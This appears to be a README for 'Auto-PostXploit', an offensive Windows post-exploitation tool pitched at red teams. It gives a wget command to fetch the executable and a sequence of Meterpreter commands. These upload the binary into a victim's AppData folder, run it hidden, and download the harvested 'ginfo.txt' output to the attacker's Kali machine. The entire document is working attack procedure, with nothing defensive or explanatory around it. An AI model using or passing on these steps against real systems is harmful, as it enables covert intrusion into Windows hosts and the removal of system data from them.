# Auto-PostXploit
<b>Windows Auto Post Exploitation - For ReD Team</b>


* https://github.com/emilyanncr/Windows-Post-Exploitation/


## Download :


  - wget https://raw.githubusercontent.com/BehzaDMagzer/Auto-PostXploit/master/Auto-PostXploit.exe
 


## Usage :

  
   - meterpreter > upload %path%/Auto-PostXploit.exe C:/Users/*USETNAME*/AppData
  
   - meterpreter > execute -H -f C:/Users/%USERNAME%/AppData/Auto-PostXploit.exe
  
  <i style="color:red;">[If Auto-PostXploit.exe Not In Process]</i>
  
   - meterpreter > download C:/Users/%USERNAME%/AppData/ginfo.txt /root/Desktop
  
   - root@kali:~# cat /root/Desktop/ginfo.txt
